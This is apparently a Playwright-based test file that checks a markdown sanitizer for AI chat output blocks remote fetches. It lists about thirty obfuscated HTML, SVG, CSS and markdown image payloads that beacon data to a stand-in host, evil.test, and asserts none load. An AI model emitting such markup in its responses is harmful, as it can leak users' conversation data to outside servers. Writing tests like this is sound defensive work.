import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { resolve } from 'node:path';
import { chromium, type Browser, type Page } from 'playwright';
import { buildSync } from 'esbuild';

/**
 * Model text in an app conversation, drawn in a real browser, with every request counted: the
 * review's payloads, through marked, the filter and an insert into the live document.
 */

let browser: Browser; let page: Page;
const out: string[] = [];
beforeAll(async () => {
  browser = await chromium.launch();
  page = await browser.newPage();
  await page.route('**/*', (r) => {
    const u = r.request().url();
    if (u.startsWith('http://app.test/')) return r.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><body></body>' });
    out.push(u);
    return r.abort();
  });
  await page.goto('http://app.test/');
  const bundle = buildSync({
    stdin: { contents: "export { dropRemoteMedia } from './src/components/lab/blocks/safeMarkdown'; export { marked } from 'marked';", resolveDir: resolve('dashboard'), loader: 'ts' },
    bundle: true, format: 'iife', globalName: 'M', write: false, platform: 'browser',
  });
  await page.addScriptTag({ content: bundle.outputFiles[0].text });
}, 60_000);
afterAll(() => browser?.close());

const draw = async (md: string): Promise<string> => {
  out.length = 0;
  const html = await page.evaluate((text) => {
    const M = (window as never as { M: { marked: { parse: (t: string) => string }; dropRemoteMedia: (h: string) => string } }).M;
    const safe = M.dropRemoteMedia(M.marked.parse(text));
    const box = document.createElement('div');
    box.innerHTML = safe;
    document.body.append(box);
    return safe;
  }, md);
  await page.waitForTimeout(150);
  return html;
};

describe('nothing remote is fetched when the text draws', () => {
  it.each([
    '![x](https://evil.test/?q=S)',
    '![a[b]c](https://evil.test/?q=S)',
    '![beacon]\n\n[beacon]: https://evil.test/?q=S',
    '<img src="https://evil.test/?q=S">',
    '<img src="//evil.test/?q=S">',
    '<img srcset="https://evil.test/?q=S 2x">',
    '<img src="h&#10;ttps://evil.test/?q=S">',
    '<img src="ht&#9;tps://evil.test/?q=S">',
    '<img src="/&#10;/evil.test/?q=S">',
    '<img src="\\\\evil.test/?q=S">',
    '<img src="/\\evil.test/?q=S">',
    '<img src="&#1;https://evil.test/?q=S">',
    '<video src="https://evil.test/?q=S" poster="https://evil.test/p"></video>',
    '<audio><source src="https://evil.test/?q=S"></audio>',
    '<span style="background:url&#40;https://evil.test/?q=S)">x</span>',
    '<svg><image href="https://evil.test/?q=S" width="9" height="9"/></svg>',
    '<svg><image xlink:href="https://evil.test/?q=S"/></svg>',
    '<svg><rect mask="url(https://evil.test/o.svg?q=S#a)" fill="url(https://evil.test/f?q=S#a)" clip-path="url(https://evil.test/c?q=S#a)" width="9" height="9"/></svg>',
    '<svg><filter id="f"><feImage href="https://evil.test/?q=S"/></filter><rect filter="url(#f)" width="9" height="9"/></svg>',
    '<svg><pattern id="p"><image href="https://evil.test/?q=S"/></pattern></svg>',
    '<div>x<style>@import url(https://evil.test/j?q=S);</style></div>',
    '<div><style>@font-face{font-family:e;src:url(https://evil.test/f?q=S)} p{font-family:e}</style><p>x</p></div>',
    '<div><style>p{background:url(https://evil.test/b?q=S)}</style><p>x</p></div>',
    '<math><mi xlink:href="https://evil.test/?q=S">x</mi></math>',
    '<link rel="stylesheet" href="https://evil.test/s.css?q=S">',
    '<body background="https://evil.test/?q=S">',
    '<table background="https://evil.test/?q=S"><tr><td>x</td></tr></table>',
    '<input type="image" src="https://evil.test/?q=S">',
    '<object data="https://evil.test/?q=S"></object>',
    '<iframe src="https://evil.test/?q=S"></iframe>',
  ])('%s', async (md) => {
    const html = await draw(md);
    expect(out, html).toEqual([]);
  });
});

describe('what stays', () => {
  it('text, links and local pictures', async () => {
    const html = await draw('hello [site](https://example.com) ![p](public/a.png) ![q](/Users/a/b.png)');
    expect(html).toContain('hello');
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('public/a.png');
    expect(html).toContain('/Users/a/b.png');
  });
});
